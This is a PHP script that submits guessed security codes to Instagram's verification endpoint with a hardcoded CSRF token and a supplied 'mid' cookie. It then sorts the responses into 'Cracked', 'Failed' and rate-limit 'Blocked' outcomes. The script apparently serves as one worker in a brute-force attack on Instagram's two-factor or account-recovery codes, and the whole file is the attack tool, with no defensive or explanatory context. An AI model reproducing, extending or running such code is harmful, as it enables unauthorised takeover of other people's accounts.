<?
$url = $_GET['url'];
$mid = $_GET['mid'];
$code = $_GET['code'];
$instagram = curl_init(); 
curl_setopt($instagram, CURLOPT_URL, $url); 
curl_setopt($instagram, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($instagram, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($instagram, CURLOPT_HTTPHEADER, array(
    'X-CSRFToken: F8Q8qKQogom1tedr1z1TeEPfR7aWFGt1',
    'X-Instagram-AJAX: 1',
    "Referer: $url",
    "Cookie: mid=$mid; csrftoken=F8Q8qKQogom1tedr1z1TeEPfR7aWFGt1;"
    ));
curl_setopt($instagram, CURLOPT_POSTFIELDS, "security_code=$code");
curl_setopt($instagram, CURLOPT_HEADER, 1);
$response = curl_exec($instagram);
if(eregi('"location": "https://www.instagram.com/"', $response))
	{
		echo "Cracked -> ${code}";
	}
	else
	{
		if(eregi("Please check the code we sent you and try again.", $response))
		{
			echo "Failed -> ${code}";
		}
		else
		{
			if(eregi("This field is required.", $response))
			{
				echo "MID : $mid fail";
			}
			else
			{
				if(eregi("Please wait a few minutes before you try again.", $response))
				{
					echo "Please wait [Blocked]->${code}";
				}
				else
				{
					if(eregi("You've entered the code incorrectly too many times.", $response))
					{
						echo "Blocked Dude :( [${code}]";
					}
					else
					{
						echo $response ;
					}
				}
			}
		}
	}
curl_close($instagram);
?>
